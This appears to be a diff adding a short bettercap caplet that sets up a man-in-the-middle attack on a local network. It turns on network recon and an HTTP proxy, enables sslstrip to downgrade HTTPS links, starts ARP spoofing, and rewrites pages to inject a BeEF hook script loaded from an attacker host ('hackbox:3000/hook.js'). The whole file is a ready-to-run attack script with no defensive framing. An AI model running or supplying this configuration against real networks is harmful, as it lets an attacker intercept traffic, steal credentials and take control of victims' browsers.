@@ -1,0 +1,21 @@
+# spoof everyone as they're discovered
+# set arp.spoof.targets 192.168.1.0/24
+# strip down https links when possible
+set http.proxy.sslstrip true
+# inject beef hook
+set http.proxy.post.filter |</head>|<script type="text/javascript" src="http://hackbox:3000/hook.js"></script></head>|
+
+# keep searching for new targets
+# net.probe on
+
+# keep reading arp table for network mapping
+net.recon on
+# redirect http traffic to a proxy
+http.proxy on
+sleep 5
+# start arp spoofing attack
+arp.spoof on
+
+
+
+
